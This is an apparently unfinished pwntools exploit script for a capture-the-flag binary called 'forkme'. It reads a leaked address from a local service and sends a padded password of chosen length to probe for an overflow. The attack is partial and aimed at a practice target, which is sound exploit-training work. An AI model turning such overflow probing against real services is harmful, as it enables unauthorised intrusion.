#!/usr/bin/python3

from pwn import *

context.binary = binary = "./forkme"

vuln_elf = ELF(binary)

gs = """
continue
"""


def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        # pty = process.PTY.buffer
        return process(vuln_elf.path)


# p = start()
p = remote("localhost", 1454)

p.recvuntil(b"flag: ")
win = int(p.recvline().strip(), 16)
log.info(f"[+] {hex(win)=}")


i = int(input())
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"password: ", b"A" * i)
# print(p.recvline().strip().decode())
# Wait for the program to crash
# p.wait()


p.interactive()
print("asdf")
